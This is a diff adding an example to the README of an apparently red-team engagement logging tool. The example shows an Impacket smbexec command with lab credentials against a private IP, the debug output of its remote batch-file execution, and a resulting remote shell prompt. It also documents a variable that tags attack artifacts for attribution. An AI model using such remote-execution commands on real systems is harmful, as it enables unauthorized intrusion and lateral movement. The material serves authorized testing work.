@@ -62,6 +62,22 @@ rtlog targets
 rtlog export md
 ```
 
+## Example
+
+```bash
+$ RTID=RTCyb3r smbexec.py cersei.lannister:il0vejaime@10.7.30.10 -debug
+[RT-ID] Active: ident=RTCyb3r
+Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies
+
+[+] Impacket Library Installation Path: /home/kali/venv/lib/python3.10/site-packages/impacket
+[+] StringBinding ncacn_np:10.7.30.10[\pipe\svcctl]
+[+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output_RTCyb3r 2^>^&1 > %SYSTEMROOT%\RTCyb3r.bat & %COMSPEC% /Q /c %SYSTEMROOT%\RTCyb3r.bat & del %SYSTEMROOT%\RTCyb3r.bat
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+The `RTID` environment variable sets a red team identifier that Impacket tools use for service/file naming on the target, making artifacts attributable during operations.
+
 ## Usage
 
 ### Engagement Management
